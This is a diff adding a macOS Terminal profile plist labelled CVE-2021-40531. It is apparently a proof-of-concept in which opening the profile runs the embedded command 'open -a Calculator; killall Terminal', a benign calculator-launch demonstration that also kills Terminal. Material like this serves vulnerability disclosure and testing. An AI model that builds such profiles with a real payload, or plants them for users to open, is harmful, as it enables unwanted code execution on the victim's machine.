@@ -1,0 +1,20 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+  <dict>
+    <key>CommandString</key>
+    <string>open -a Calculator; killall Terminal</string>
+    <key>ProfileCurrentVersion</key>
+    <real>1.0</real>
+    <key>RunCommandAsShell</key>
+    <false/>
+    <key>name</key>
+    <string>CVE-2021-40531</string>
+    <key>shellExitAction</key>
+    <integer>0</integer>
+    <key>type</key>
+    <string>Window Settings</string>
+    <key>warnOnShellCloseAction</key>
+    <integer>0</integer>
+  </dict>
+</plist>
